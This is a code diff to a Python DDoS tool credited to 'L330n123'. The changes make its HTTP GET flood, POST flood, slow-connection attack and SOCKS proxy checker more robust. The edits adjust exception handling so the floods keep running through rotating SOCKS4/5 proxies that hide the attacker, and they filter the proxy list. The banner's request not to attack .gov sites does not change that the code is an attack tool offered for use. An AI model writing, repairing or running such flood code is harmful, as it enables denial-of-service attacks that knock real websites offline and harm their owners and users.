@@ -27,7 +27,7 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 3.1 (Fixed)
+Python3 version 3.1.1 (dirty fix)
                             C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
@@ -211,13 +211,10 @@ def cc(socks_type):
 		referer = "Referer: "+random.choice(referers)+ ip + url2 + "\r\n"
 		try:
 			proxy = random.choice(proxies).strip().split(":")
-			try:#dirty fix
-				if socks_type == 4:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-				if socks_type == 5:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			except:
-				continue
+			if socks_type == 4:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			if socks_type == 5:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
@@ -236,8 +233,8 @@ def cc(socks_type):
 				s.close()
 			except:
 				s.close()
-		except:
-			s.close()
+		except:#dirty fix
+			pass
 			err = err +1
 	cc(socks_type)
 
@@ -259,13 +256,10 @@ def post(socks_type):
 	while True:
 		try:
 			proxy = random.choice(proxies).strip().split(":")
-			try:#dirty fix
-				if socks_type == 4:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
-				if socks_type == 5:
-					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			except:
-				continue
+			if socks_type == 4:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
+			if socks_type == 5:
+				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
@@ -283,14 +277,14 @@ def post(socks_type):
 			except:
 				s.close()
 		except:
-			s.close()
+			pass#dirty fix
 			err = err + 1
 	post(socks_type)
 
 socket_list=[]
 def slow(conn,socks_type):
-	proxy = random.choice(proxies).strip().split(":")
 	try:#dirty fix
+		proxy = random.choice(proxies).strip().split(":")
 		if socks_type == 4:
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 		if socks_type == 5:
@@ -364,8 +358,8 @@ nums = 0
 def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 	global nums
 	global proxies
-	proxy = lines.strip().split(":")
 	try:#dirty fix
+		proxy = lines.strip().split(":")
 		if socks_type == 4:
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 		if socks_type == 5:
@@ -432,7 +426,8 @@ def check_list(socks_file):
 	temp_list = []
 	for i in temp:
 		if i not in temp_list:
-			temp_list.append(i)
+			if ':' in i:
+				temp_list.append(i)
 	rfile = open(socks_file, "wb")
 	for i in list(temp_list):
 		rfile.write(bytes(i,encoding='utf-8'))
